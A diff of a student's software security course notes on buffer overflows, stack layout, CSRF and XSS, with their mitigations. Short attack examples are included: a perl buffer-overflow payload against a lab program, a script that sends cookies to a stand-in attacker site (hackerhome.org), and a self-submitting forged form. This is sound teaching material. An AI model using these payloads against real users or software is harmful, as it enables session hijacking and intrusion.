@@ -26,7 +26,7 @@ Black Hat
 
 Dev Con
 
---------------------------------------------------------
+-------------------------------------------------------
 
 Software Security Lecture 2 Notes
 
@@ -411,8 +411,8 @@ Something you ARE
 
 -pros: "raises the bar"
 -cons: false negatives/positives, social acceptance, key management
-	-false positive: authentic user rejected
-	-false negative: imposter accepted
+	-false positive: imposter accepted
+	-false negative: authentic user rejected
 -phsyical biometrics can change
 -fingerprints are only partial so 2 people could potential authenticate with same print
 -photos can sometimes permanently compromise biometric
@@ -905,7 +905,7 @@ Principle of Least Privilege
 Defense-in-depth 
 -also called redundancy/diversity: layers of defense, don't rely on any one for security
 -Examples
-	-Banks: Security Guards, Bullet-Proof, Teller Window, Dye on Money
+	-Banks: Security Guards, Bullet-Proof Teller Window, Dye on Money
 -numerous levels of defense all providing security in another way that results in several layers attacker must pass
 -make sure layers are sequential or inline
 	-meaning you bypass one level of security and then have to bypass the next level
@@ -978,7 +978,7 @@ Usability
 -Users are lazy (they ignore security dialogs)
 	-prevent users from committing insecure actions, assist them in doing it securely
 	-"Why Johnny Can't Encrypt" -"usability for security"
--Gave the jet example where so complicated to use that the engineers actually had to help them use it
+-Gave the jet example where the ui and security process was so complicated to use that the engineers actually had to help them use it
 
 Usability for Security
 -Definition: (Whitten-Tygar) Security software is usable if the people who are expected to use it:
@@ -1016,11 +1016,1857 @@ PGP is web of security
 
 -------------------------------------------------------
 
-Software Security Lecture 5 Notes
+Software Security Lecture 6 Notes
+
+(skipped 5 because snow day)
+
+buffer
+-temporary storage
+-continuous section of memory
+
+-when thinking of buffer overflow, look for variables
+
+variables-particularly strings are used for buffer overflow
+	-strings
+		-unpredictable in length with input
+		-strings in a lot of languages have to be null terminated
+		-usually char arrays
+			-so in the beginning they start at 0 and end with null throwing off the math
+		-so there is a starts at 0 problem and off by one problem
+
+	-integer
+		-could also have integer overflow
+		-if user gets to determine size of something
+			-could either make number too big so that it wraps around to a negative value
+
+-buffer overflow
+	-when you store something into memory outside of where the program had allocated memory
+		-might overwrite program or system code
+	-some languages monitor this to prevent it
+	-C/C++ do not check for that
+
+Examples in C/C++
+
+char buf[4]
+//this is a non-null terminated string
+//this is bad... if you tried to print, it would keep roin
+strcpy(buf,"abcd")
+strcat
+strcmp
+//returns 3
+strlen(buf)
+//returns length of buf till you get to null character
+sizeOf(buf)
+
+
+-the language lets you index buf[5] even though that character doesn't pertain to buff at all
+-c/c++ lets you access any memory
+
+-an exploitable buffer overflow needs to be user defined code (an input field)
+
+
+"gets" reads in every character till crlf
+-don't use gets in our buffer overflows
+	-can use a copy of the implementation of gets, but not gets 
+
+
+-overwriting stuff in the stack, because we are using statically allocated variables not dynamically allocated
+
+-need to know whats on a stack and what other things you might overflow 
+
+-indirect input means not taking value from user, but from memory
+
+Risk Categories
+-most risky
+	-direct input & No bounds checking (gets)
+-very risky
+	-indirect input & no bounds checking (strcat)
+-moderately risky
+	-direct input with bounds checking (fgets)
+-low risk 
+	-indirect input with bounds checking (strncat)
+
+
+-can not trust user in Security
+-if user can manipulate data and rewrite return pointer they can make your program go where you want
+
+-don't want to mix use control with program logic
+
+Dangerous Library Routines
+-C/C++ are filled with routines that do not perform bounds checking
+	-strcpy, srcat
+		-ocunt on the null character to terminate
+		-will happily overwrite memory until NULL is read from source
+	-sprintf, etc.
+		-must ensure destination buffer larger enough to hold string that results from all of the input variables
+	-gets, scanf, etc.
+		-do not limit input to fixed size
+	-format string driven functions
+		-printf, sprintf, etc.
+		-allow attackers to write arbitrary values into memory if they can influence content of format string
+
+memory regions
+	-program args and environment
+	-stack -local variables (static)
+		-> static means size declared at compile-time
+		-> return pointer, stack frame pointer (SBP)
+			-stack frame pointer tells where the bottom of the current frame is (not the bottom of the stack)
+			-this means that if you enter a method, SBP saves where that method starts -> then everything added onto the stack during that method can be popped when we return back down to where the SBP is
+		-> function parameters
+	-heap - dynamically allocated local variables
+		-> new/malloc
+		-> typically heap functions like a big linked list
+		-> usually with pointers
+			-> pointer manipulation is one of the big problems here
+		-> no return pointers on the heap, and obviously no SBP, because its not a stack
+		-> could overwrite next or prev frame pointer
+		-use after free problem
+			-using memory you have already freed (shouldn't be done)
+		-double free
+	-Data
+		-initialized global variables
+	-Block sequence storage (BSS)
+		-uninitialized global variables
+	-Text 
+		-compiled instructions
+			-not the code, the compiled code
+			-will need some tool to interpret
+
+Sample layout
+
+virtual addresses
+	0x00000000 		Text
+					Data
+					BSS
+					Heap
+					down arrow
+					up arrow
+	0xFFFFFFFF		Stack
+
+-you can never overwrite onto another application b.c. virtual addresses
+	- unless shared memory, b.c. then there is that mapping to another memory space
+	-so you can't smash another applications stack
+
+Visual example
+-what are some examples of critical values on the stack?
+-what about the heap?
+
+input buffer | other stuff | critical value
+
+Steps to smashing the stack
+-inject machine code of exploit into heap or stack
+-cause running program to jump to this code
+-most common place to overflow is stack
+	-large amount of potential buffers allocated in local functions
+	-overwriting these buffers can also overwrite the return pointer
+	-careful attacker can overwrite the return pointer with the mem location of the exploit code
+	-when the function RETs the program jumps to the start of the attack code
+
+why stacks?
+-to allow functions to call functions
+-if functions could only be one level deep, then a fixed data structure could be used to store the return information
+-since functions can call functions it is important that all of the return information for each function call be saved
+-since depth of functions is not defined at compile time, it is important that the amount of memory that needs to be reserved for function variables is dynamically allocated
+
+Important registers
+-EIP - instruction register
+	-points to location in memory that the CPU should execute next
+	-never overwrite EIP -> we would overwrite something that would set EIP to the value of the return pointer
+		-so we would overwrite past the buffer onto the return pointer which then gets stored in EIP
+-ESP - stack pointer
+	 - points to the current "top" of stack
+	 - also register, so you don't techinically overwrite this
+-EBP - used to efficiently reference local variables
+	 - also register, so you don't techinically overwrite this
+
+-go over function call walkthrough several times
+
+Function Call Walkthrough
+-when a caller transfers execution to a function the following steps are taken
+1 	- arguments to function are pushed onto stack in reverse order
+	-address of the next instruction in the calling function is pushed on the stack
+-the called function on start-up (prologue) must
+
+2 	- push current value of EBP onto the stack
+	-set EBP to current ESP value
+3 	- allocate space for local variables by moving the 
+	 stack pointer enough to leave space for them
+
+ESP -> 	--------------------------------
+				Str
+		3 		b
+EBP -> 	--  --  --  --  --  --  --  --  
+		2 	sfp (main)
+		 ret addr (main)
+		 	1 	a
+ESP ->  --------------------------------
+		  3 	x
+		  		y
+EBP ->  -- -- --  --  --  -- --  --- ---
+		2  sfp (libc)
+		ret addr (libc)
+			1 	argv
+				argc
+
+#include <stdio.h>
+int main (int argc, char * argv[])	1
+{ 	2
+		int x;
+		int y;
+		func(x);
+}
+	int func(int a){ 1 2
+		char str[10];
+		int b = 2;
+		strcpy(str, "Add A to B");
+		printf("%s", str);
+		return b + a;
+	}
+
+when the return occurs
+	-return value of function is saved in accumulator
+	- ESP = EBP
+	- pop EBP to restore frame buffer
+	- RET (EIP = top of stack)
+
+-the stack is process specific
+-one process can not smash another processes stack
+-can overwrite other memory regions maybe if in correct direction
+
+Exploitation methods
+-run program normally a few times to get acquainted
+	-observe input values of interest
+-just type in long strings, see if program scratches
+-see how many chars it takes to crash
+-guess which chars might work (e.g. T for true, specific critical numbers)
+-analyze the code
+-run gdb to analyze dynamically
+
+-remember ints store 2s compliment
+
+Alternative Functions
+-many replacement functions exist which allow you to specify a maximum length
+-strncpy(char * dst, char * src, size_t len)
+	-copies up to len bytes from src to dst
+	- if src length >= to len, dst will not be nil terminated
+	-if src length < len, remainder of dst will be nil filled
+-strncat(char * dst, char * src, size_t len)
+	-appends up to len chars to end of dst
+	-like strncpy does not nil terminate if length of src >= len
+	-be careful! len refers to the space remaining in dst
+
+
+a better strncpy : strlcpy
+-available at ....
+-size_t strlcpy (char * dst, const char * src, size_t size);
+	-copies up to size-1 characters from the NUL-terminated string stc to
+	-dst, Nil-terminating the result
+	-dst is guaranteed to be nil terminated if size > 0
+	-size refers to total size of dst, not number of bytes from src
+-size_t strlcat(char * dst, const char * src, size_t size)
+	-concatenates src to dst using same semantics as strlcpy
+
+always make sure to null terminate your string
+
+-can still miscalculate the buffer size on accident
+
+-additional approaches
+	-rewriting old string manipulation code
+		-it is expensive
+	-StackGuard/canaries (Crispin Cowan)
+	-Static checking (e.g. Coverity, Fortify, Ounce)
+	-Non-executable stacks and address randomization (aka Address space layout randomization ASLR)
+		-won't let you execute anything from stack
+		-addresses aren't relative, so its hard to know where to set the return address to ( can add noops to get through code)
+		-these 2 terms are wrapped up into Data Execution Prevention (DEP)
+	-Interpreted languages (e.g., Java, C#)
+
+-mircro-kernel
+	-this took a lot of system functions and put them into applications
+
+-monolithic kernel
+	-when OS and all apps in OS all compiled into 1 big thing
+	-everything ran in kernel
+	-this was a big issue b.c. the kernel needs to be very reliable which this setup is not
+
+Non-executable stacks don't solve it all
+-attack could overwrite return addresses to point to newly injected code
+-NX stacks can prevent this, but not the vault example (jumping to an existing function)
+-return-to-libc attack:jump to library functions
+	-e.g. /bin/sh or cmd.exe to gain access to a command shell (shellcode) and complete code
+	-you can just jump to these functions in your app to run these, rather than execute it from the stack
+	-however with ASLR the spot of these libraries is randomized making this attack harder
+-return Oriented Programming (ROP)
+	-don't jump to a function, just jump to a set of functions that do what you want
+		-you write malicious assembly and compile it to see opcodes
+		-you could just find the 3 functions you want to be put together (if they are spread out) and use the return pointer to jump around and build the return chain you want to call your functions in order
+
+-applications had to opt-in to this protection
+	-if you are doing pointer manipulation with hard coded pointers then your code would break if you switched to these features
+
+b line# to add breakpoint
+-run list to get the lines of code
+
+-can print variables or &variablename to get address
+
+-can print system call location with print &system
+
+-can see stack starting with buffer
+
+x/20x &buffer
+
+
+-------------------------------------------------------
+
+Software Sec Lecture 7 Notes
+
+
+Midterm on Monday
+
+list 
+-lists the code
+
+disass 
+-disassembles the code
+
+know how to find buffer overflow from dissassembly
+	-look for gets and its the far right column
+
+-remember to find the return address of a function, you look at the line after the call of the function on the stack
+
+-should know how to fix a buffer overflow
+	-just validating the buffer
+
+-stack frame pointer is always pointer before return pointer
+
+-m.c. is like what is best answer here
+	-based on slide
+	-like sec. mechanism, and what sec. goal does this serve
+
+-remote buffer overflow
+	-getting any user access is elevating your access because you have user access on a system you didn't have
+-local buffer overflow 
+	-user access isn't anything, because you could already execute user access
+	-need to elevate to root access
+	-running as set uid 
+		-tells any user that runs that app is running with root privileges
+
+with segmentation fault you are either hitting return pointer or stack frame pointer
+
+perl -e 'print "A"x28',"\x48\xf2\xff\xbf","\xf4\x84\x04\x08","\n";' | ./lame
+
+perl
+-e means execute now
+-says print A 28 times and then concatenate the 
+- , concatenates strings
+- can simulate input by using \n
+
+
+
+where does the stack exist -bfff blah blah
+where is the code segment - again general area
+
+-remember a program running with set uid is more dangerous because it is running with privilage
+
+-remember java isn't exploitable with buffer overflow
+
+
+
+Review for Midterm
+-Security Goals
+	-why is software sec a problem
+		-virtually guaranteed existence of vulnerabilities
+		-software is built to be extensible, causes problems
+
+-networking is ubiquitous
+	-almost all software is connected to internet, increasing the attack vector
+
+-software is becoming more like the car industry
+	-technology is being chosen based on security
+
+-different issues in software lifestyle
+	-dev, deployment, operation, sustainment
+		-how security can creep up in each of these areas
+
+-know difference b.w. bug and flaw
+	-implementation problem (coder), vs. designer or architect
+
+-what is secure software
+	-dependable, trustworthy, survivable
+	-know definitions, and also be able to determine if a system is not one of these and why
+
+-know differences b.w. different goals of software sec
+	-authentication
+	-authorization
+	-integrity
+	-accountability
+	-confidentiality
+	- etc.
+-be able to recognize what a system is doing
+
+security in SDLC
+	-slide with boxes on it and different phases of software development
+		-requirements and use cases, architecture and design,test plans, code, test results
+		-software security requires a combination of security in all these things
+
+-2nd slide deck
+	-designing in security
+	-know what these are and be able to recognize them
+		-principle of least privilage
+		-defense in depth vs diversity in defense
+			-layering different types of security vs. different vendors for the same security concept
+				-2 types of firewalls, 2 types of input validation
+		-securing the weakest link
+	-go over principles and understand what they mean conceptually
+
+-buffer overflows
+	-majority of questions from this
+
+-know risk categories
+	-most risky, least risky, etc.
+	-will give code sampes or definition of an application and put them in the proper order as far as most risk to least risk
+
+-be familiar with string copy, sprint or whatever
+	-will give us the implementation of these and we will have to determine if it is vulnerable to buffer overflow, and what risk level it is
+
+-know code regions, what belongs on stack and heap
+-what is difference b.w. stack overflow vs. heap overflow
+	-caused by local static vs global dynamically allocated variables
+	-stack you're overwriting other local variables and return pointers while on the heap you are overwriting link list pointers and things like that
+
+-know what it means to smash the stack
+	-injecting code onto stack and then jumping back to that code using buffer overflow
+
+-don't worry about his security standards
+
+
+-know function walkthrough stuff
+	-like where is return address, where does this variable land, etc. 
+
+-how do you fix a buffer overflow
+	gets vs fgets with a length
+	-just know you need a function that takes a boundary fgets(buffer,size)
+	-dont use an integer for size because it can wrap around and then becomes a negative
+
+	-fix string copies with strncpy vs strlcpy
+		-strncpy needs to account for off by one problem
+
+	aslr-address space layout randomization
+		-why invented, what it fixes
+		-counter return to libc attack
+			-jumps to another library in memory
+
+
+	-DEP (data execution prevention) aka non-executable stacks
+		-prevent code from running on stack
+		-when eip points to address on stack seg fault
+		-stack canaries - you would see it before return pointer (random number right before that if it gets overwritten the program will crash)
+			-we turned it off
+
+-know how to find return pointer
+-understand it is next line of code 
+
+-bring computer for exam
+
+-------------------------------------------------------
+
+Software Security Lecture 8 Notes -- test
+
+-------------------------------------------------------
+
+Software Security Lecture 9 Notes
+
+-go over test
+
+-why is c/c++ open to buffer overflow
+	- they let you overwrite into memory
+	- doesn't do bounds checking on arrays
+	- starts at 0 so calculation errors
+	- need to be null terminated so people might forget that
+
+-need to use something besides gets and tell how many characters to pull in
+-instead of strcpy
+	-could change buffer to match what you are reading in
+		-then you could use strncpy
+	-could use strlcpy because it will add null terminator
+
+
+Agenda
+-domain: where our apps and services are hosted
+-cross-domain: security threats due to interactinos b.w. our applications and pages on other domains
+-Alice is simultaneously (i.e. same browser session), using our ("good") web-app and a "malicious" web app
+-Security Issues? Solutions?
+	-cross-site request forgery, scripting...
+
+Same-origin policy
+-Origin (domain)
+	1. protocol
+	2. hostname
+	3. port
+-scripts can only access properties (cookies, DOM objects) of documents of same origin
+
+Document Object model
+	-html elements
+	-javascript elements
+	-cookies
+document.blah
+-you access any objects from the page you are on
+
+Same-Origin Examples
+-Same-Origin
+	http://www.examplesite.org/here
+	http://www.examplesite.org/there
+	-same protocol: http, host: examplesite, default port 80
+-all different origins
+	http://www.examplesite.org/here
+	https://www.examplesite.org/there
+	http://www.examplesite.org:8080/thar
+	http://www.hackerhome.org/yonder
+	-different protocol: http vs. https, different ports: 80 vs. 8080 vs. 443, different hosts examplesite vs. hackerhome
+
+Possible interactions of Docs from different origins
+-hackerhome.org can link to us, can't control
+	<a href="http://www.mywwwservice.com/some_url">Click here!</a>
+-or include a hidden embedded frame: <iframe style="display: none" src="http://www.mywwwservice.com/some_url"></ifram>
+	-no visible cue to the user (style attribute hides it)
+	-happens automatically, w.o user interaction
+	-visiting someones website gives them an opening to send attacks at our browser
+-same-origin policy prevents javascript on hackerhome direct access to our DOM
+-occasionally, data loaded from one domain is considered to originate from different domain
+	<script src="http://www.mywwwservice.com/some_url"></script>
+-hackerhome can include this script loaded from our site, but it is considered to originate from hackerhome instead
+	-if wwwservice was doing something malicious to DOM it would do it to hacker home's site
+	-loading script from another website is bad practice
+-included script can inspect contents of enclosing page which can define evaluation environment for script
+-another way attacker can intiate requests from user's browser to our server:
+	<form name="f" method="POST" action="http://www.mywwwservice.com/action">
+		<input type="hidden" name="cmd" value="do_something">
+		....
+	</form>
+	<script>document.f.submit();</script>
+	-website can post information on your behalf without your consent 
+-form is submitted to our server w.o any input from user
+	-only has a hidden input field, nothing visible to user
+	-form has a name, so script can access it via DOM and automatically submit it
+
+HTTP Request Authentication
+-HTTP is stateless so web apps have to associate requests with users themeselves
+-HTTP authentication: username/password automatically supplied in HTTP header
+-cookie authentication: credentials requested in form, after POST app issues session token
+-browser returns session cookie for each request
+-hidden-form authentication: hidden form fields transfer session token
+-Http & cookie authentication credentials are cached
+
+
+Lifetime of Cached Cookies and HTTP Authentication credentials
+-remember its up to the browser to follow these rules
+	-they don't have to actually follow these rules
+-temporary cookies cached until browser shut down persistent ones cacehd until expiry date
+	-if no date then they persist till someone deletes them
+-http authentication credentials cached in memory, shared by all browser windows of a single browser instance
+	-still just dependent on how browser implements http auth rules
+-caching depends only on browser instance lifetime, not in whether original window is open
+
+Credential Caching Scenario
+-(1) Alice has browser window open, (2) creates new window  (3) to visit our site , HTTP authentication stored
+-(4) she closes the window, but original one still open (5) later, she's lured to the hacker's site which causes a surreptitious request to our site utilizing the caching credentials
+-credentials persisted even after (4), cookies could have been timed-out; step (5) could happen days or weeks after (4)
+
+-bad to depend on the browser to end a session
+	-web app should handle it on logout
+
+Single sign on are notorious for keeping you logged in when you didn't want to be
+
+Attack Patterns
+-security issues arising from browser interacting with multiple web apps (ours and malicious ones), not direct attacks
+-cross-site request forgery (CSRF)
+-cross-site script inclusion (XSSI) - super rare
+-cross-site scripting (XSS)
+
+Cross-site request forgery (CSRF)
+-forging a form (post request and getting browser to send it)
+-malicious site can initiate HTTP requests to our app on Alice's behalf, w.o her knowledge
+-cached credentials sent to our server regardless of who made the request
+-Ex: change password feature on our app
+	<form method="POST" action="/update_profile">...
+	New Password: <input type="password" name="password">
+	....
+	</form>
+	-hacker site could execute a script to send a fake password-change request to our form
+	-authenticates b.c. cookies are sent
+
+1. Alice's browser loads page from hackerhome.org
+2. Evil script runs causing evilform to be submitted with a password-change request to our "good" form:
+	www.mywwwservice.com/update_profile with a <input type="password" id="password"> field
+3. Browser sends authentication cookies to our app. We're hoodwinked into thinking the request is from Alice.  Her password is changed to evilhax0r
+
+-a lot of websites prevent this by requiring someone to type in their old password
+
+-malicious site can't read info, but can make your browser do bad things
+
+CSRF impacts
+-malicious site can't read info, but can make write requests to our app
+-in alice's case, attacker gained control of her account with full read/write access!
+-who should worry about csrf?
+	-apps w/server-side state: user info, updatable profiles such as username/password (e.g. Facebook)
+	-apps that do financial transactions for users (e.g. Amazon, eBay)
+	-any app that stores user data (e.g. calendars, tasks)
+
+
+login seeeserf (CSRF)
+-somebody had someone else login as them with google and then tracked what they were doing
+
+Cross-site scripting (XSS)
+-what if attacker can get a malicious script to be executed in our application's context?
+-access user's cookies, transfer to their server
+
+-Ex: our app could have a query parameter in a search URL and print it out on page
+	-http://www.mywwwservice.com/query?question=cookies
+	-following fragment in returned html document with value of parameter questions inserted into page
+	-unfiltered input allows attacker to inject scripts
+
+	...<p>your query for 'cookies' returned the following results:</p>...
+
+-look for a user input value on page and then same value being submitted and then returned back to you in the same format
+
+XSS example
+-alice tricked into loading url (thru link or hidden frame sourcing it)
+-server's response contains
+	http://www.mywwwservice.com/query?question=cookies+%3Cscript%3Emalicious=script%3C/script%3E
+		-attack string url-encodes < and>
+	<p> your query for 'cookies <script>malicious=script</script>' returned the following results: </p>
+-malicious-script, any script attacker desires, is executed in context of our domain
+
+XSS exploits: stealing cookies
+-malicious script could cause browser to send attacker all cookies for our app's domain
+-attacker gains full access to Alice's session
+	<script>
+		i = new Image();
+		i.src = "http://www.hackerhome.org/log_cookie?cookie=" + escape(document.cookie); // URL = encode
+	</script>
+-script associated with our domain
+	-can access document.cookie in DOM
+	-constructs url on attacker's server, gets saved in log file, can extract info from cookie parameter
+
+XSS Exploits: Scripting the vulnerable application
+-complex script with specific goal
+	-get personal user info, transfer funds, etc...
+	-more sophistiated than just stealing cookies
+-advantages over cookie stealing
+	-stolen session cookie may expire before it's used 
+	-never makes a direct request to our server
+	-we can't log his IP, he's harder to trace
+
+
+XSS Exploits: modifying web pages
+-attacker can script modifications to web pages loaded form our site by manipulating DOM
+-part of social engineering, phishing attack
+-intended for viewing by victim user
+-modified page is loaded from our site
+	-so URL is still the same
+	-no certificate-mismatch even with SSL
+	-hard to tell that modification is by 3rd party
+
+Sources of untrusted data
+-query parameters, HTML form fields
+-path of the URI which could be inserted into page via a "document not found" error
+-cookies, parts of the http request header (e.g. referer header)
+-data inserted into a SQL DB, file system
+-3rd party data (e.g. RSS feed)
+
+Stored vs. reflected XSS
+-reflected XSS: script injected into a request and returned immediately in response (like query parameter example)
+-stored XSS: script delivered to victim some time after being injected
+	-stored somewhere in the meantime
+	-attack is repeatable, more easily spread
+	-Ex: message board with injected script in a message, all users who view the message will be attacked
+-underlying issue for both is untrusted data
+-ex2: comment box with a script
+-with reflected you have to get each person to click on your attack individually
+
+MySpace attacked by stored XSS Worm
+-XSS really damaging when stored XSS can propagate in a worm-like pattern
+-in 2005, XSS worm released on MySpace
+	-propagated through profiles via friend connections
+	-payload harmless: added user "Samy" to infected user's friends list
+-impact: MySpace down for several hours to clean up profiles (but XSS worm impact could be much worse!)
+
+
+-most .NET objects have built in xss prevention 
+
+Mitigations and Preventions
+
+preventing CSRF
+-http requests originating from user action are indistinguishable from those intiiated by a script
+-need own methods to distinguish valid requests
+-inspecting referer headers
+-validation via User-Provided Secret
+-Validation via Action Token (CSRF token)
+
+-inspecting referer headers
+	-referer headers specifies the URI of document originating the request
+	-assuming requests from our site are good, don't serve requests not form our site
+	-OK, but not practical since it could be forged or blanked (even by legitimate users)
+		-for well-behaved browsers, reasonable to expect referer headers to be accurate, if present
+		-but if blank, we can't tell if it's legitimate or not
+
+validation via user-provided secret
+-old way to do it
+-can require user to enter secret (e.g. login password) along with requests that make server-side state changes or transactions
+-Ex: the change password form (10.2.1) could ask for the user's current password
+-Balance with user convenience: use only for infrequent, "high-value" transactions
+	-password or profile changes
+	-expensive commercial/financial operations
+
+Validation via CSRF Token
+-add special action tokens as hidden fields to "genuine" forms to distinguish from forgeries
+-same-origin policy prevents 3rd party from inspecting the form to find the token
+-need to generate and validate tokens so that 
+	-malicious 3rd party can't guess or forge token
+	-then can use to distinguish genuine and forged forms
+	-how? we propose a scheme next
+
+Generating CSRF Tokens
+-concatenate value of timestamp or counter c with the Message Authentication Code (MAC) of c under secret key k:
+	-token T = MACK(c) || c
+	-security dependent on crypto algorithm for MAC
+	-|| denotes string concatenation, T can be parsed into individual components later
+-recall from 1.5., MACs are function of message and secret key (see ch. 15 for more details)
+
+Validating CSRF token
+-split token T into MAC and counter components
+-compute expected MAC for given c and check that given MAC matches
+-if MAC algorithm is secure and K is secret, 3rd party can't create MACK(c), so can't forge token
+
+Problem wiht Scheme
+-application will accept any token we've previously generated for browser
+-attacker can use our application as an oracle!
+	-uses own browser to go to page on our site w/form
+	-extracts the token from hidden field in form
+-need to also verify that incoming request has action token sent to the same browser (not just any token sent to some browser)
+
+Fixing the problem
+-bind value of action token to a cookie
+	-same origin polciy prevents 3rd party from reading or setting our cookies
+	-use cookie to distinguish b.w. browser instances
+-new scheme
+	-Cookie C is unpredictable, unique to browser instance
+	-C can be session authentication cookie
+	-Or random 128 bits specifically for this purpose
+	-L = action URL for form with action token
+	-Compute T = MACK(C||d||L), d is separater (e.g.;)
+	-d ensures uniqueness of concatenation
+
+-know to use a framework that supports csrf protection
+	-.NET, ZAPPY, etc.
+
+-Leakage of ACtions Tokens
+	-token should be in payload of http request, not in url
+	-no state information in url
+	-for get requests action token visible as query parameter in request URL
+		-would appear in proxy and web server logs
+		-could be leaked in referer header if page contains references (images, links) to 3rd party documents
+	-http spec recommends POST instead of GET
+	-scheme incorporates target action URL into MAC computation
+		-if one URL is leaked, can't be used against another
+		-use fresh cookie for each browser instance, so stolen action token not usable for future sessions
+
+-Analysis: Limitations in presence of XSS vulnerabilities
+	-if app is vulnerable to XSS attack, action token scheme is ineffective
+	-attacker can inject script to steal cookies and corresponding action tokens
+	-or even directly "fill out" forms and submit request within context of user's session
+	-but if XSS vulnerability exists, attacker already has a better mode of attack than CSRF
+
+Analysis: Relying on the format of submitted data
+-make form request really complicated to try and prevent CSRF attack
+	-it just makes the form more complicated, but not unforgable
+
+.NET Mitigations
+	-LM OWASP ESAPI Library
+	-OWASP .NET CSRF Guard
+
+-could do viewstate validation to prevent CSRF attack
+	-can't forge viewstate
+
+USing ESAPI CSRF Token
+
+using Owasp.Esapi.Interfaces;
+namespace Owasp.Esapi
+{
+	public class HTTPUtilities : IHTTPUtilities
+		public void AddCsrfToken()
+		public string AddCsrfToken(string href)
+		public void VerifyCsrfToken()
+}
+
+string url = Esapi.HttpUtilities.AddCsrfToken(Request.Url.ToString().Substring(0,length));
+
+
+-don't forget to verify the csrf token or else its worthless
+
+ESAPI Important Points
+-call this method in a filter or front controller so that it gets called for every request
+-to protect a GET request (which shouldn't be necessary if the GET is truly non-idempotent)
+
+-Any other idaes to fix CSRF
+	-the annoying password verification page
+	-CAPTCHA and reCAPTCHA walk into a bar
+	-double submit cookie
+		-easy implementation, and doesn't require storage of CSRF token
+		-put random value in cookie and copy that same value into form
+			-as long as these 2 values mathc then the form is valid
+			-what the value is doesn't matter
+
+Preventing XSS
+-never send untrusted data back to browser as part of http response
+	-s.t. data could cause execution of script
+	-usually can just escape/sanitize/encode certain characters
+-sanitize or escape certain characters
+	-validate user input on way in
+-we show examples of various contexts in HTML document as template snippets
+	-variable substitution placeholders: %(Var)s
+	-evil-script; will denote what attacker injects
+	-contexts where XSS attack is possible
+-html encode, url encode, javascript escape
+	-must be contextually releveant
+
+General Considerations
+-input validation vs. output sanitization
+	-XSS is not just a input validation problem
+	-strings with html metachars not a problem until they're displayed on the webpage
+	-might be valid elsewhere, e.g. in a database, and thus not validated later when output to HTML
+	-sanitize: check strings as you insert into HTML doc
+-html escaping
+	-escape some chars with their literals
+	-e.g. & = &amp; < = &lt; > = &gt; "=&quot;
+	-library functions exist, but check docs (may not escape all chars)
+
+.NET will do html escaping
+
+simple Text
+-most straightforward common situation
+-example context:
+	<b>Error: your query '%(query)s' did not return any results, </b>
+	-attacker sets query = <script>evil-scriptl</script>
+	-html snippet renders as
+	<b> Error: Your query '<script>evil-script;</script>' did not return any results.</b>
+-prevention: html-escape untrusted data
+-rationale: if not escaped
+	-<script> tags evaluated, data may not display as intended
+
+Tag Attributes (e..g form field value attribtues)
+-contexts where data is inserted into tag attribute
+-example html fragment:
+	-<form...><input name="query" value="%(query)s"></form>
+	-Attacker sets query = cookies"><scirpt>evil-script;</script>
+	-renders as 
+				<form...><input name="query" value="cookies"><script>evil-script;</script>">
+				</form>
+	-attacker able to "close the quote", insert script
+
+preventing attribute injection attacks
+-need to encode all normal attributes characters
+
+URL attributes (href and src)
+-dynamic url attribtues vulnerable to injection
+-script/style sheet urls: <script src="%(script_url)s">
+	-attacker sets script_url = http://hackerhome.org/evil.js
+
+Style attributes
+-need to encode same characters
+
+Javascript
+-little different here because encoding here is really escaping
+-enclose strings in quotes and escape with \
+
+-redirects,cookies,other headers
+	-use url encoding to escape characters and prevent XSS
+
+filters for "Safe" subsets of html
+-allow "safe" subset of HTML and render to user
+-Ex: web-based e-mail app
+	-can allow "harmless" html tags (e.g. <h1>)
+	-but don't allow execution of malicious scripts
+
+unspecified charsets
+-different encodings can be used to bypass input validation mechanisms
+-always specify the charset on your page
+
+C# Anti-XSS library
+-microsoft developed
+-provides sanitizing/encoding routines for user input
+-replace:
+	//Get the query stirng parameter 'Name', if it wasn't specified don't write anything
+	String Name = Request.QueryString["Name"];
+
+-with
+	//Get the query stirng parameter 'Name', if it wasn't specified don't write anything
+	String Name = AntiXss.HtmlEncode(Request.QueryString["Name"]);
+
+
+-don't encode before storing in DB
+-store raw in DB and encode on the way out
+
+-chart of what encoding mechanisms to use when
+	-if he asks to encode in url encode then know % sign
+	-know what each encoding looks like
+		-html, javascript, url 
+
+Mitigating the Impact of XSS attacks
+-http-only cookies: incomplete protectino
+	-says no script on page can access cookie
+	-HTTPOnly attribute
+	-can prevent traditional session hijacking
+	-just mitigates session stealing
+-binding session cookies to IP address
+	-if anyone tries to hijack your session you can compare the IP address
+	-problems when lots of people have same IP
+-------------------------------------------------------
+
+
+Software Security Lecture 10 Notes
+
+a little review
+
+domain
+-host, cookie, port
+-keep these in mind when looking for vulnerabilities b.c. they will help indicate which vulnerabilities are possible
+
+-multiple cookies for one website
+
+-can link to another website, post to another website, but can not access DOM or scripts (same origin)
+
+-CSRF example
+	-a bad guy tricks your browser into submitting a post on your behalf
+	-so attacker tricks you into submitting a request
+	-either clicking a link to open an html page, or to visit his page
+	-blind attack
+		-the attacker doesn't know if the attack is successful
+	-ways to protect
+		-use action token or csrf token in the request
+			-validates the form saying that you got the form from us, not the bad guy
+		-check in the referer header
+			-sometimes works
+			-says you came from my website so you got the form from me
+			-if there is no referer header do you just invalidate the request? lots of broken requests
+		-double submit cookie
+			-use javascript to add stuff from the cookie into the request 
+			-functions like a csrf token
+			-only you could get a cookie from your domain to add in
+
+Cross-Site-Scripting
+	-if checking for a vuln
+	-1. does it take user input
+	-2. does it print that input out to the screen anywhere?
+	-sanitization
+		-input validation and output encoding
+		-when encoded they have to be encoded in a type that is relevant
+		-output encoding has to be as close to actual output as possible
+		-we don't know where the data is going to end up, so we don't want to encode before storing in DB
+	-what can you do with XSS
+		-anything browser can do with javascript
+		-take cookie and post it to bulletin
+		-trace key strokes to file and give yourself the file
+		-could use someone elses code (by writing a link to the code)
+	-it can happen almost anywhere on the request
+		-header, url, cookie, form, javascript, xml on the page
+		-if the web app pulls this data in and spits it out then it could be vulnerable
+	-are mobile devices vulnerable
+		-if the browser can run js then yes
+		-if you are in a native app that uses some sort of REST client 
+			-if the app doesn't know how to run scripts then it won't be vulnerable
+			-unless it has some sort of embedded web client (facebook that has links to load a web browser)
+	-anything that has some sort of javascript capability will have a possible vulnerability
+
+Proxies
+
+Burp Suite
+-can use it to look at http messages
+	-listening on 127.0.0.1
+	-port 80
+-fireproxy
+	-basically firefox but lets you switch b.w. proxies easily
+
+testfire.net
+-lets you test scanners and such
+-can "spider" it
+	-add it to your scope and spider it
+	-will find various requests and pages
+		-finds all gets and posts on page
+-only care about forms with input
+
